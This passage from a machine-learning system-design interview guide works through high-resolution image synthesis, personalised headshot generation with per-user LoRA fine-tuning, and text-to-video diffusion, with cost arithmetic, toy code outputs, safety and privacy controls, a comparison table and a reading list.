- **Upscale only what users keep.** Previews at 1024² cost a quarter of the tokens; the expensive stage runs on the one image the user selects (the same "upscale on selection" economics as §14.4).
- **Tiled decoding** splits the final decode into overlapping tiles so GPU memory stays bounded; the overlaps are blended to hide seams.
- **Memory:** attention over 16,384 tokens (2048² at f = 8, 2 × 2 patches) needs memory-efficient attention kernels; batch sizes shrink, so throughput per GPU falls.

### Evaluation and the loop (minutes 30–38)
- **Crop-level human evaluation** (faces, text, hands, fabrics) against the previous model and a strong upscaler baseline.
- **Patch FID** plus FID at a fixed downsampled size; **autoencoder reconstruction quality** (PSNR and perceptual metrics) as its own gate — if the decoder smears, nothing upstream can fix it.
- Track **artefact rates** (duplication, seams) from a classifier and user reports.

### Scaling and cost
Say the cost ratio explicitly: a 2048² one-shot generation has 4× the tokens and ~16× the attention work of 1024²; the cascade adds a few upscaler steps instead of multiplying every denoising step. Further levers: fewer sampling steps via distillation, caching the text encoding, and running the upscaler only on selected images.

### Safety
The same prompt and image gates as §14.4; high resolution makes forged documents and realistic likenesses more convincing, so provenance (watermark + C2PA) is attached at the final stage, after upscaling.

### Failure modes
| Failure | Response |
|---|---|
| Duplicated subjects at high resolution | Generate at trained resolution then upscale; add artefact classifier |
| Blurry textures | Check the autoencoder first (reconstruction gate), then data resolution filters |
| Upscaler invents details that change the content | Condition strongly on the base latent; limit upscaling steps; compare downsampled output to base |
| GPU out-of-memory at 2048² | Tiled decode, memory-efficient attention, smaller batches — sized before launch |

### Follow-ups (Q→A)
- **Q: "Why not just run a classic super-resolution network on the 1024² output?"** A: That is the cheapest baseline and should be measured. It sharpens edges but cannot invent plausible detail; a generative upscaler can, at the risk of changing content — decide by crop-level human evaluation.
- **Q: "Make the autoencoder compress more (f = 16 or 32) to save compute."** A: Tokens drop 4× or 16×, but reconstructions lose fine detail; only worth it with more latent channels and a better decoder — the toy shows the same trade-off (smaller codebook → higher compression, lower PSNR).
- **Q: "Pixel-space patches give the same token count — why a latent?"** A: The toy's table shows 16 × 16 pixel patches also give 4,096 tokens, but each token must produce 768 values instead of 16; the autoencoder has already removed imperceptible detail, so the generator spends capacity on content.

### What separates levels, and variations
Mid-level says "use a bigger model"; senior does the token arithmetic and chooses between latent diffusion, cascade and tokens with reasons; staff designs the preview-then-upscale product flow, makes the autoencoder a gated component and prices the 16× attention growth. **Variations:** *panoramas and wallpapers* (wide aspect ratios: bucketing, or several overlapping diffusion windows fused together) and *product photos at print resolution* (text and logos must stay exact — composite real assets instead of generating them).

### Toy: token arithmetic and a VQ codebook (`code/latent_compression.py`)
```python
for k in (4, 16, 64, 256):
    cb = kmeans(train.copy(), k)                                  # the codebook
    codes = ((tp[:, None, :] - cb[None]) ** 2).sum(2).argmin(1)   # one code per 4x4 patch
    rec = unpatch(cb[codes], 64)                                  # the "decoder"
```
Output:
```
1) How long is the sequence the generator must model? (attention cost ~ tokens^2)
   representation                                    tokens  values/token  attention pairs vs f=8
   pixels, 1 token per pixel                      1,048,576             3   6.554e+04x
   pixels, 16x16 patches                              4,096           768           1x
   latent f=8 (128x128x4), 2x2 patches                4,096            16           1x
   latent f=32 (32x32x16), 1 token per position       1,024            16      0.0625x
   values per image: pixels 3,145,728 vs f=8 latent 65,536 -> 48x fewer numbers to denoise
   cascade: base model at 64x64 (4,096 px) then super-resolution 64->256->1024; the base sees 256x fewer pixels than one-shot 1024x1024 generation

2) Toy VQ autoencoder on 64x64 images (4x4 patches -> one code each; held-out image)
   codebook | bits/patch | compression vs 8-bit pixels | PSNR dB (higher is better)
          4 |          2 |                     64x      |   19.6
         16 |          4 |                     32x      |   22.0
         64 |          6 |                     21x      |   24.0
        256 |          8 |                     16x      |   25.3
   (the generator then models 256 code indices per image instead of 4,096 pixels)
```
Every compression choice is a trade: each step up in codebook size buys ~1.3–2.4 dB of reconstruction quality and costs compression. The same trade decides the real autoencoder's factor *f* — and it is why the decoder's quality caps the whole system.

### TL;DR
Never generate megapixels directly: compress (f = 8 latent → 48× fewer numbers), generate in latent space at the trained resolution, then upscale only selected images with a latent or cascaded super-resolution stage; high-resolution data, aspect buckets and size conditioning; gate the autoencoder separately; evaluate on crops, because FID is blind to detail; 2× side = 4× tokens = 16× attention.

---

## 14.13 Case: personalised headshot generation

> **The question (paraphrased).** Users upload 10–20 selfies, pay once, and within an hour receive ~40 professional headshots in chosen styles (studio, outdoor, business casual) that clearly look like them. Expect 20,000 new users a day. Design it.

### Requirements (minutes 0–8)
**Recognition.** "This is **subject-driven generation**: teach a pretrained text-to-image diffusion model one new identity from a handful of photos, then render that identity in new scenes. The design question is *per-user fine-tuning* versus a *zero-shot identity encoder*, and the product is really a **per-user GPU job pipeline** with biometric data in it ([§8.2](../08-prompting-vs-finetuning-vs-rag-and-llm-evaluation/README.md), [§10.5](../10-generative-models-beyond-text/README.md))."

**Success.**
- *Primary:* **"looks like me" rate** — share of delivered photos the user keeps or downloads; a proxy is **identity similarity**, the cosine similarity between face-recognition embeddings (e.g. ArcFace) of outputs and of the uploads.
- *Quality:* realism and style fidelity (human ratings; CLIP score against the style prompt).
- *Guardrails:* refund rate, **generation of someone other than the account holder** (consent violations), and time to delivery (p90 under an hour).

**Scope.** Fixed style catalogue (no free-text prompts in v1 — it removes most abuse), adults only, photos deleted on a fixed schedule.

### Approach: data and model (minutes 8–18)
**Two ways to inject an identity:**

| Approach | How | Identity fidelity | Cost and latency |
|---|---|---|---|
| **Per-user fine-tuning** — DreamBooth (Ruiz et al., 2023), usually with **LoRA** (Hu et al., 2022) | Train on the user's photos, binding the face to a rare token: "a photo of [v] person" | Highest — learns details a single embedding misses | GPU minutes per user; minutes-to-hour latency; one adapter file per user |
| **Zero-shot identity encoder** — e.g. IP-Adapter (Ye et al., 2023), InstantID (Wang et al., 2024) | A pretrained encoder turns a face photo into conditioning vectors injected at generation time | Good, weaker on unusual features | No training; seconds; nothing per-user to store |

**Recommendation:** per-user LoRA fine-tuning for the paid product (users are paying for likeness), with a zero-shot encoder for an instant free preview.

**How the fine-tuning works, in plain words:**
- **Rare-token binding.** Use an identifier the model has no strong meaning for, such as "[v]", so training attaches the new face to it rather than overwriting a common word. (Textual Inversion, Gal et al., 2022, learns only a new token embedding — cheapest, but weaker identity.)
- **LoRA:** freeze the base model's weights *W* and learn a low-rank update *B·A* (rank *r* of 4–64) in the attention layers. The adapter is megabytes, not gigabytes, and many users' adapters share one base model in GPU memory ([§8.2](../08-prompting-vs-finetuning-vs-rag-and-llm-evaluation/README.md)).
- **Prior preservation.** Fine-tuning on one face makes *every* "person" look like the user (the model forgets the class — DreamBooth calls this *language drift*). The fix: also train on images the *frozen* model generates for "a photo of a person", with a loss that keeps those outputs unchanged. The toy shows the trade-off in numbers.
- **Overfitting.** Too many steps and the model copies the uploads' backgrounds, clothes and pose. Use few steps (hundreds to about a thousand), augmentation (crops, flips), and early stopping on identity-vs-diversity metrics.

**Input quality decides output quality.** Before any GPU time: detect exactly one face per photo, reject blur, heavy filters, sunglasses and near-duplicates, require variety of angle and lighting, and **check that all photos show the same person** by clustering face embeddings. That last check is also the consent control.

### Architecture (minutes 18–30)
**Envelope** (illustrative, from the toy): training ~12 GPU-minutes per user × 20,000 users/day = 4,000 GPU-hours/day ≈ **167 GPUs busy around the clock**, ≈ $0.60 per user at $3/GPU-hour; inference 40 portraits × ~6 GPU-seconds ≈ $0.20 per user ($0.40 if you over-generate 2× and select, below); one rank-16 adapter ≈ 8 MB. Price the product against ~$1 of GPU cost per user.

```mermaid
flowchart LR
    UP["Upload 10-20 selfies plus consent"] --> QC{"Photo QC - one face, sharp, varied, same person as account"}
    QC -- "fail" --> FIX["Ask for better photos"]
    QC -- "pass" --> PREP["Crop, align, caption, generate class images for prior"]
    PREP --> JQ[["Training job queue - per-user, priority by paid time"]]
    JQ --> TR["LoRA fine-tune on GPU worker - fixed steps, checkpoints"]
    TR --> AD[("Adapter store - encrypted, per user")]
    AD --> GEN["Multi-adapter inference - base model shared, adapter hot-swapped"]
    GEN --> SEL{"Identity score and safety filter"}
    SEL -- "pass" --> DEL["Gallery for user"]
    SEL -- "fail" --> REGEN["Regenerate with new seed"]
    DEL -.-> TTL["Deletion job - photos, adapter, outputs after N days"]
```

- **Training is a batch job with an SLA.** Jobs run on a queue with idempotent retries (a crashed job restarts from its last checkpoint); paid-priority users jump the queue. Workers keep the base model loaded; each job loads only the user's photos.
- **Serving many adapters on one base model.** Batch requests from different users on one GPU and apply each request's LoRA update on the fly (the idea behind multi-LoRA serving systems such as S-LoRA; Sheng et al., 2023). No per-user copy of the model ever exists.
- **Over-generate and select.** Generate ~2× the delivered count, score identity similarity, style match and artefacts, deliver the best 40. Selection is cheaper than a failed order.
- **Deletion is part of the pipeline**, not a support ticket: photos, adapter and outputs carry a time-to-live and a deletion job verifies they are gone from storage, caches and backups.

### Evaluation and the loop (minutes 30–38)
- **Identity similarity distribution** per style (some styles — heavy stylisation, profile views — lose identity).
- **Prior drift check** per model version: generate generic "person" images with the user's adapter loaded and confirm they don't look like the user.
- **Human panel** on likeness and realism; keep/refund rates by style feed the style catalogue.
- **Fairness:** identity similarity and keep rate by skin tone, age and gender presentation — face models and base generators are uneven, and a group getting worse likeness is paying for a worse product.

### Scaling and cost
The GPU bill is mostly training (60–75% in the illustrative numbers, depending on how much you over-generate). Levers: fewer steps with better initialisation, lower rank, smaller training resolution, pre-computing text encodings, and the zero-shot encoder for users who only want a few images. Spread training across off-peak capacity — most users accept "within an hour".

### Safety and privacy
- **Biometric data.** Face templates used to identify or match a person — exactly what the same-person and identity checks compute — are *special category* biometric data under GDPR (Art. 9), and face geometry is regulated by laws such as Illinois BIPA: explicit consent, a stated purpose and retention period, no use for training shared models without separate opt-in, and deletion on request.
- **Only your own face.** The same-person check across uploads plus a live selfie matched to the uploads (a liveness check) stops users making headshots of someone else.
- **Fixed styles, filtered outputs.** No free-text prompts, a nudity/violence filter on every output, adults only (age estimation with human review for borderline cases).

### Failure modes
| Failure | Response |
|---|---|
| Bad uploads → poor likeness | QC gate before GPU spend; ask for better photos |
| Training job crashes | Retry from checkpoint under the same job key; SLA clock visible to the user |
| Outputs don't look like the user | Identity-score gate, regenerate; if systematic for a group, it is a fairness bug |
| Deletion request | Verified cascade over photos, adapter, outputs, caches; audit record |

### Follow-ups (Q→A)
- **Q: "Cut GPU cost by 80%."** A: Offer zero-shot identity encoding for the free tier and previews; shorten training (fewer steps, lower rank); train at lower resolution. Measure the likeness drop with identity similarity before committing.
- **Q: "Every generated person now looks like the user."** A: Prior drift — add or strengthen the prior-preservation loss. In the toy, weight λ = 5 cuts drift from 1.18 to 0.52 at the same identity error; λ = 25 cuts it further but identity error doubles.
- **Q: "Why not keep the photos to improve the model?"** A: Biometric data needs a separate, explicit opt-in; default to deletion. Improve the model with licensed, consented datasets.
- **Q: "Could a user upload a celebrity's photos?"** A: The liveness selfie must match the uploads; a public-figure similarity check adds a second barrier.

### What separates levels, and variations
Mid-level says "fine-tune Stable Diffusion on the selfies"; senior compares DreamBooth + LoRA with zero-shot encoders, names prior preservation and overfitting, and runs training as a queued job; staff treats consent and deletion as pipeline stages, serves thousands of adapters on shared base models and prices GPU cost per user against the product price. **Variations:** *pet portraits* (same pipeline, no biometric law — but the same overfitting problem) and *product photography for small shops* (subject = a product; exact logo and text fidelity matter more than style).

### Toy: rank, prior preservation and cost (`code/headshot_lora.py`)
A frozen linear "generator" stands in for the diffusion model; five noisy "selfies" define the identity.

```python
M = dW if rank is None else B @ A              # LoRA: learn B @ A, W0 stays frozen
E = (W0 + M) @ X - Y                           # fit the user's photos
g = 2 * E @ X.T / X.shape[1]
if lam:
    Ep = M @ P_train                           # prior preservation: other "person" prompts
    g += lam * 2 * Ep @ P_train.T / P_train.shape[1]   # must keep the frozen model's outputs
```
Output:
```
identity error and prior drift are relative to the size of the identity offset (1.0 = the whole offset)
method                         | trainable params | identity error | prior drift
no fine-tuning                 |                0 |           1.00 |        0.00
full fine-tune, no prior loss  |            2,048 |           0.23 |        1.10
LoRA r=4, no prior loss        |              384 |           0.24 |        1.18
LoRA r=4 + prior loss (lam=1)  |              384 |           0.23 |        0.70
LoRA r=4 + prior loss (lam=5)  |              384 |           0.23 |        0.52
LoRA r=4 + prior loss (lam=25) |              384 |           0.45 |        0.33
LoRA r=1 + prior loss (lam=5)  |               96 |           0.23 |        0.49

Per-user cost (illustrative assumptions)
   training: 12 GPU-min x $3.0/GPU-h = $0.60 per user; 20,000 users/day -> $12,000/day, 167 GPUs busy around the clock
   adapter: 100 projection matrices of 1280x1280, rank 16 -> 4,096,000 params = 8.2 MB in fp16 (vs 328 MB for those matrices in full)
   inference: 40 portraits x 6 GPU-s = 240 GPU-s = $0.20 per user
```
LoRA with 384 parameters fits the identity as well as a full fine-tune with 2,048 — one identity is a low-rank change. Without the prior loss, other "person" prompts move *more* than the identity offset itself (drift 1.10–1.18): every person starts to look like the user. The prior loss removes most of that drift, but weighting it too heavily (λ = 25) stops the model learning the face.

### TL;DR
Per-user LoRA fine-tuning (DreamBooth-style: rare token + prior preservation) for likeness, zero-shot identity encoders for instant previews; photo QC and same-person checks before GPU spend; training is a queued job with checkpoints; many adapters share one base model; over-generate and select by identity score; biometric consent and verified deletion are pipeline stages; ~$1 of GPU per user.

---

## 14.14 Case: text-to-video generation

> **The question (paraphrased).** A creative app lets users type a prompt and get a 5-second 720p video clip, with an option to extend it. Target 200,000 clips a day. Design the model and the system.

### Requirements (minutes 0–8)
**Recognition.** "This is text-to-image (§14.4) with a time axis — a **latent video diffusion** model ([§10.7](../10-generative-models-beyond-text/README.md)) — but the numbers change the architecture: one clip is ~26 images' worth of tokens, generation takes minutes, and the new quality problem is **temporal consistency**. It is an asynchronous GPU job pipeline with previews."

**Success.**
- *Primary:* **clips kept or shared per session**, and human preference in side-by-side tests.
- *Automatic:* **FVD** (Fréchet Video Distance — FID's idea applied to video features; Unterthiner et al., 2018) and per-dimension suites such as **VBench** (subject consistency, motion smoothness, flicker, prompt alignment; Huang et al., 2024).
- *Guardrails:* safety incidents (especially realistic depictions of real people), wait time by tier, GPU cost per kept clip.

**Latency.** Minutes, stated up front; a few-second **preview** (low-resolution or a keyframe) keeps users engaged. **Scope:** text-to-video and image-to-video, 5 s, 720p, no audio in v1.

### Approach: data and model (minutes 8–18)
- **Compress space *and* time.** A video autoencoder shrinks each frame spatially (e.g. 8×) and merges neighbouring frames (e.g. 4×). The toy's arithmetic: 120 frames at 1280 × 720 become 30 latent frames × 3,600 tokens = **108,000 tokens** — 26× a 1024² image.
- **Backbone options:**
  - **Inflate a text-to-image model:** insert **temporal layers** (attention or convolution across frames at each spatial position) into a pretrained image model, and fine-tune on video (Make-A-Video, Singer et al., 2022; Video LDM, Blattmann et al., 2023; Stable Video Diffusion, Blattmann et al., 2023). It reuses everything the image model knows about appearance.
  - **A diffusion transformer over spacetime patches**, trained on video and images together: OpenAI's Sora technical report (2024) describes this approach, and it scales with compute.
  - **A cascade:** generate a short, low-resolution, low-frame-rate clip, then run temporal interpolation and spatial super-resolution stages (Imagen Video, Ho et al., 2022).
- **Attention cost decides the layout.** Full spacetime attention over 108,000 tokens is ~1.2 × 10¹⁰ pairs; **factorised attention** (spatial attention within each frame, then temporal attention across frames at each position, as in Ho et al.'s *Video Diffusion Models*, 2022) is ~30× cheaper, and grows only 2× — instead of 4× — when the clip doubles in length. Many systems mix both.
- **Data is the moat and the bottleneck.** Video with *good captions* barely exists. Pipeline: split videos at scene cuts (a clip should be one shot), filter by motion (drop static slideshows), aesthetics, resolution, text overlays and watermarks, then **re-caption every clip with a video captioning model** (the Sora report and others describe recaptioning; this is §14.10's model reused). Train jointly on images for appearance and videos for motion. Licensing and consent of source footage need legal review ([§12.10](../12-safety-ethics-governance/README.md)).
- **Consistency comes from denoising all frames together.** Frames generated one by one with independent noise flicker; joint denoising with temporal layers makes the noise, and so the detail, move with the content. The toy measures this.

### Architecture (minutes 18–30)
**Envelope** (illustrative): 200,000 clips/day ≈ 2.3 clips/s × ~300 GPU-seconds per clip ≈ **694 busy GPUs**, ≈ **$50,000/day** at $3/GPU-hour, **$0.25 per clip**. One clip may need several GPUs at once (sequence parallelism splits the tokens across GPUs) to finish in minutes.

```mermaid
flowchart LR
    C["Client"] --> API["API - prompt gate, enhancer, idempotency key"]
    API --> PV["Preview lane - keyframe or low-res clip, seconds"]
    PV --> C
    API --> JQ[["Job queues by tier"]]
    JQ --> SCH["Scheduler - packs multi-GPU jobs, warm weights"]
    SCH --> GEN["Latent video diffusion - base clip"]
    GEN --> UP["Temporal interpolation plus super-resolution"]
    UP --> VG{"Video gate - frame-sampled safety, likeness"}
    VG -- "pass" --> OUT[("Object store plus CDN - watermark, C2PA")]
    VG -- "fail" --> HOLD["Discard, log, credit user"]
    OUT -.-> C
    GEN -. "checkpoints every N steps" .-> CK[("Job checkpoints")]
```

- **Preview first.** A keyframe (one image from the prompt) or a small, short clip costs a few percent of a full render; users who reject the preview never pay for the full clip. In the toy, previews at 5% cost that cut full renders by 30% save **$12,500/day**.
- **Multi-GPU jobs need a real scheduler.** A job that needs 4 GPUs for 2 minutes must wait for 4 free GPUs on one host; the scheduler packs jobs to avoid fragmentation and keeps model weights warm (loading tens of GB takes longer than a short job).
- **Checkpoint long jobs** so a preempted or crashed worker resumes rather than restarts; retries use the idempotency key so one clip is billed once.
- **Extension** ("make it longer") conditions a new segment on the last frames of the previous one; drift accumulates, so limit extensions or re-anchor on the first frame.
- **The video gate** samples frames (plus motion-aware checks) for nudity, violence and realistic likenesses of public figures; it runs before the clip is visible.

### Evaluation and the loop (minutes 30–38)
- **FVD and VBench-style dimensions** per model version on a fixed prompt suite (people, animals, text, fast motion, camera moves).
- **Human side-by-side preferences** decide launches; separate ratings for visual quality, motion quality and prompt following, since models trade them off.
- **Physics and consistency probes** (objects vanish, hands merge, text changes between frames) become regression prompts.
- Keep/share/regenerate rates per model version close the loop, like the pick rate in §14.4.

### Scaling and cost
Levers: previews and keyframe approval, fewer sampling steps (distillation), factorised attention, generating at lower frame rate and interpolating, a batch tier for off-peak capacity, and caching the prompt enhancer's output. Longer clips scale worse than linearly with full attention — price length tiers accordingly.

### Safety
Video is the most convincing medium for deepfakes. Prompt gate and video gate both **fail closed**; block generation of identifiable real people unless verified consent exists; attach invisible watermarks and C2PA credentials; keep generation logs to answer takedown and law-enforcement requests; and red-team for election, violence and non-consensual imagery ([§12.7](../12-safety-ethics-governance/README.md)).

### Failure modes
| Failure | Response |
|---|---|
| Flicker or morphing objects | Temporal layers and joint denoising; consistency probes in the regression suite |
| Job preempted mid-render | Resume from checkpoint; idempotent billing |
| GPU fragmentation leaves jobs waiting | Gang scheduling by job size; separate pools for 1-GPU previews and multi-GPU renders |
| Safety gate outage | That lane stops; no ungated clip is ever published |

### Follow-ups (Q→A)
- **Q: "Why not generate 120 images with the image model?"** A: Independent frames flicker and objects change identity; the toy shows flicker falling from 0.281 to 0.090 with correlated noise and to 0 when noise moves with the content. Consistency needs frames denoised together.
- **Q: "Users want 20-second clips."** A: 4× the tokens: full attention costs 16×, factorised ~4×. Offer extension by segments with re-anchoring, and price it as a tier.
- **Q: "How do you get training captions?"** A: Recaption the whole corpus with a video captioner, then check caption quality on a sample — caption detail directly controls how well the model follows prompts.
- **Q: "Cost per kept clip is too high."** A: Measure the keep rate by prompt type, put previews in front of expensive renders, route simple prompts to a smaller model, and sell a slow batch tier.

### What separates levels, and variations
Mid-level says "diffusion, but for video"; senior computes spacetime tokens, chooses factorised vs full attention, explains temporal consistency and recaptioning, and makes it an async multi-GPU job pipeline with previews; staff prices clip length, designs gang scheduling and checkpointing, and treats likeness and provenance as launch blockers. **Variations:** *image-to-video animation of product photos* (conditioning on a real image; motion must not distort the product) and *video editing* (restyle or inpaint an existing video; structure from the source keeps consistency).

### Toy: tokens, flicker and fleet cost (`code/video_budget.py`)
```python
indep = [f + sigma * rng.normal(size=f.shape) for f in clean]            # frame-by-frame generation
shared = [f + np.roll(base, t, axis=1) for t, f in enumerate(clean)]     # noise moves with the content
...
e = rho * np.roll(e, 1, axis=1) + np.sqrt(1 - rho ** 2) * sigma * rng.normal(size=f.shape)  # correlated
```
Output:
```
1) A 5 s, 24 fps, 1280x720 clip in a video latent space
   120 frames -> 30 latent frames x 3,600 tokens/frame = 108,000 tokens (26x a 1024x1024 image's 4,096)
   full spacetime attention pairs: 1.166e+10
   factorised (spatial within frame + temporal per position): 3.920e+08  (30x fewer)
   doubling length to 10 s: full x4, factorised x2.0

2) Temporal consistency (residual detail is the same size in every case)
   clean frames                         flicker 0.000
   independent per-frame generation     flicker 0.281
   correlated across frames (rho=0.9)   flicker 0.090
   shared, motion-aligned               flicker 0.000

3) Fleet arithmetic (assumed 300 GPU-s per 5 s clip, $3/GPU-h)
   200,000 clips/day = 2.31 clips/s x 300 GPU-s = 694 busy GPUs; $50,000/day; $0.25 per clip
   a 4-frame low-res preview at ~5% of the cost = $0.013; if previews cut full renders by 30%, saving $12,500/day
```
The same amount of random detail looks completely different depending on how it is shared across frames: independent noise flickers badly, noise that follows the motion does not flicker at all. That is what joint denoising with temporal layers buys. The token and fleet numbers explain why video is an asynchronous, preview-first product.

### TL;DR
Latent video diffusion: compress space and time (5 s 720p ≈ 108,000 tokens), temporal layers or a spacetime transformer with factorised attention, joint image-video training on recaptioned, filtered clips; frames must be denoised together for consistency; async multi-GPU jobs with previews, checkpoints and gang scheduling (~694 GPUs, $0.25/clip at 200k/day); FVD/VBench plus humans; both safety gates fail closed, provenance on every clip.

---

## Comparison across the model-centric cases

| | Email completion | Translation | Captioning | GAN faces | High-res synthesis | Personalised headshots | Text-to-video |
|---|---|---|---|---|---|---|---|
| **Model family** | Small decoder-only LM, distilled | Multilingual encoder-decoder Transformer | Image encoder + bridge + LM | StyleGAN (mapping network, styles) | Latent diffusion (DiT) + upscaler or cascade | Diffusion + per-user LoRA (DreamBooth) or identity encoder | Latent video diffusion with temporal layers |
| **Key training data** | Consented email text, de-identified | Parallel + mined + back-translated text | Human captions + filtered web alt text | Consented, aligned, identity-deduplicated faces | High-resolution images, aspect buckets | User's 10–20 selfies + prior images | Scene-split, filtered, recaptioned video + images |
| **Decode / sample** | Beam search + confidence threshold | Beam search per sentence | Beam + grounding rerank | One forward pass; truncation ψ | Denoising steps in latent space, then upscale | Denoising with adapter; over-generate and select | Joint denoising of all frames |
| **Primary metric** | Acceptance with trigger rate, characters saved | Human MQM per pair; COMET/chrF | Screen-reader-user usefulness | Human realism; FID + precision/recall | Crop-level human preference | "Looks like me" keep rate; identity similarity | Clips kept; human preference; FVD/VBench |
| **Binding guardrail** | Offensive / attribute-guessing suggestions; memorisation | Critical errors (negation, numbers); gender bias | Hallucinated objects (CHAIR); sensitive attributes | No memorised identities | Artefacts; cost per image | Someone else's face; biometric deletion | Real-person likeness; wait by tier |
| **Latency posture** | ~100 ms p90 per keystroke | ~300 ms interactive; batch for pages | Async at upload | Tens of ms; pre-generated pool | Seconds; preview then upscale | Minutes to an hour (training job) | Minutes; seconds for preview |
| **Dominant cost** | Request volume (~10⁶/s peak) | Tokens per pair; per-pair models | Batch GPU inference | Training; screening | Attention growth (2× side = 16×) | Per-user training (~$0.60) | Multi-GPU minutes per clip |
| **Signature control** | Client-side trimming + silent-by-default gate | Per-pair gates + quality estimation | Attribute policy outside the model | Face-embedding near-duplicate filter | Autoencoder quality gate | Same-person check + verified deletion | Previews + fail-closed video gate |
| **Toy script** | `smart_compose.py` | `translation_toy.py` | `caption_toy.py` | `gan_faces_toy.py` | `latent_compression.py` | `headshot_lora.py` | `video_budget.py` |

Patterns that repeat: **the model family follows from the latency and the data**, not from fashion; **compress before you generate** (latents for images and video, distillation for text); **a knob at sampling time** (threshold, truncation, reranking, over-generate-and-select) is cheaper than retraining; **automatic metrics catch regressions, people decide launches**; and **policy that must never be violated lives outside the model**.

---

## Chapter TL;DR

| Topic | Remember |
|---|---|
| Pacing | 8 / 5 / 5 / 12 / 8 / 5 / 2 minutes; exit sentence per phase; plan in minute one; timebox aloud |
| Interviewer moves | Redirect → keep your numbers; stress → fallback + alarm; depth → two levels, offer a third; disagreement → name the deciding variable |
| Legal | Negative metrics bind; synchronous per-claim verification; citation graph + treatment metadata; refusal as a product; fail closed |
| Meetings | Three regimes, one data path; workflow not agent; comb-shaped load → queue; ACLs bound truth; deletion propagates to derived data |
| Text-to-image | Math first (23.1/s → 231 busy GPUs); queues = pricing + autoscaling + UX; utilisation is the business; two gates fail closed |
| Coding agent | Tests inside, CI outside, humans at the end; sandbox without credentials; repo is untrusted; draft on exhaustion; reviewer throughput is the bottleneck |
| Critique | Invariants → loops → reliability → economics → quality; consequence + fix per finding; blockers / week one / later |
| Email completion | Small distilled LM, ~100 ms; avoid requests on the client; beam search + confidence threshold on the trigger-vs-acceptance curve; per-user blend; never guess attributes |
| Translation | One multilingual encoder-decoder with language tags (not 9,900 models); back-translation for low-resource; segment + cache; per-pair chrF/COMET + human MQM, not BLEU alone |
| Captioning | Frozen image encoder + bridge + LM; async at upload; grounding rerank, CHAIR for hallucination; attribute policy outside the model; screen-reader users decide |
| GAN faces | StyleGAN mapping network + styles; watch coverage, FID with precision/recall, not losses; truncation = quality vs diversity; near-duplicate filter proves "not a real person" |
| High-res synthesis | Compress first (f = 8 → 48× fewer numbers); generate at trained resolution, upscale only kept images; gate the autoencoder; 2× side = 16× attention |
| Headshots | Per-user LoRA (rare token + prior preservation) vs zero-shot identity encoder; QC and same-person check before GPU; multi-adapter serving; biometric consent and verified deletion |
| Text-to-video | Spacetime latents (~108k tokens for 5 s 720p); factorised attention; joint denoising for consistency; recaptioned data; async multi-GPU jobs with previews and checkpoints |

## Further reading — primary papers for Part II
- **Email completion (§14.8):** Chen et al., *Gmail Smart Compose: Real-Time Assisted Writing* (KDD 2019, arXiv:1906.00080); Carlini et al., *The Secret Sharer* (USENIX Security 2019, arXiv:1802.08232); Hard et al., *Federated Learning for Mobile Keyboard Prediction* (2018, arXiv:1811.03604); Reuters, *Fearful of bias, Google blocks gender-based pronouns from new AI tool* (27 November 2018) for the pronoun policy.
- **Translation (§14.9):** Vaswani et al., *Attention Is All You Need* (2017, arXiv:1706.03762); Johnson et al., *Google's Multilingual Neural Machine Translation System* (TACL 2017, arXiv:1611.04558); Sennrich, Haddow and Birch, *Improving NMT Models with Monolingual Data* (2016, arXiv:1511.06709) and *Neural Machine Translation of Rare Words with Subword Units* (2016, arXiv:1508.07909); Kudo and Richardson, *SentencePiece* (2018, arXiv:1808.06226); NLLB Team, *No Language Left Behind* (2022, arXiv:2207.04672); Conneau et al., *Unsupervised Cross-lingual Representation Learning at Scale* (2020, arXiv:1911.02116); Papineni et al., *BLEU* (ACL 2002); Rei et al., *COMET* (2020, arXiv:2009.09025); Freitag et al., *Experts, Errors, and Context* (MQM, 2021, arXiv:2104.14478); Stanovsky et al., *Evaluating Gender Bias in Machine Translation* (2019, arXiv:1906.00591).
- **Captioning (§14.10):** Vinyals et al., *Show and Tell* (2015, arXiv:1411.4555); Xu et al., *Show, Attend and Tell* (2015, arXiv:1502.03044); Dosovitskiy et al., *An Image is Worth 16x16 Words* (ViT, 2021, arXiv:2010.11929); Radford et al., *CLIP* (2021, arXiv:2103.00020); Li et al., *BLIP* (2022, arXiv:2201.12086) and *BLIP-2* (2023, arXiv:2301.12597); Chen et al., *Microsoft COCO Captions* (2015, arXiv:1504.00325); Sharma et al., *Conceptual Captions* (ACL 2018); Vedantam et al., *CIDEr* (2015, arXiv:1411.5726); Anderson et al., *SPICE* (2016, arXiv:1607.08822); Hessel et al., *CLIPScore* (2021, arXiv:2104.08718); Rohrbach et al., *Object Hallucination in Image Captioning* (2018, arXiv:1809.02156).
- **GAN faces (§14.11):** Goodfellow et al., *Generative Adversarial Nets* (2014, arXiv:1406.2661); Karras et al., *Progressive Growing of GANs* (2018, arXiv:1710.10196), *A Style-Based Generator Architecture* (StyleGAN, 2019, arXiv:1812.04948), *Analyzing and Improving the Image Quality of StyleGAN* (2020, arXiv:1912.04958) and *Training GANs with Limited Data* (ADA, 2020, arXiv:2006.06676); Brock et al., *BigGAN* (2019, arXiv:1809.11096); Heusel et al., *FID* (2017, arXiv:1706.08500); Kynkäänniemi et al., *Improved Precision and Recall Metric* (2019, arXiv:1904.06991); Deng et al., *ArcFace* (2019, arXiv:1801.07698).
- **High-res synthesis (§14.12):** Rombach et al., *High-Resolution Image Synthesis with Latent Diffusion Models* (2022, arXiv:2112.10752); van den Oord et al., *VQ-VAE* (2017, arXiv:1711.00937); Esser et al., *Taming Transformers* (VQGAN, 2021, arXiv:2012.09841); Ho et al., *Cascaded Diffusion Models* (2022, arXiv:2106.15282); Saharia et al., *Imagen* (2022, arXiv:2205.11487); Peebles and Xie, *DiT* (2023, arXiv:2212.09748); Podell et al., *SDXL* (2023, arXiv:2307.01952).
- **Headshots (§14.13):** Ruiz et al., *DreamBooth* (CVPR 2023, arXiv:2208.12242); Hu et al., *LoRA* (2022, arXiv:2106.09685); Gal et al., *Textual Inversion* (2022, arXiv:2208.01618); Ye et al., *IP-Adapter* (2023, arXiv:2308.06721); Wang et al., *InstantID* (2024, arXiv:2401.07519); Sheng et al., *S-LoRA* (2023, arXiv:2311.03285).
- **Text-to-video (§14.14):** Ho et al., *Video Diffusion Models* (2022, arXiv:2204.03458) and *Imagen Video* (2022, arXiv:2210.02303); Singer et al., *Make-A-Video* (2022, arXiv:2209.14792); Blattmann et al., *Align your Latents* (Video LDM, 2023, arXiv:2304.08818) and *Stable Video Diffusion* (2023, arXiv:2311.15127); OpenAI, *Video generation models as world simulators* (Sora technical report, 2024); Unterthiner et al., *FVD* (2018, arXiv:1812.01717); Huang et al., *VBench* (2024, arXiv:2311.17982).
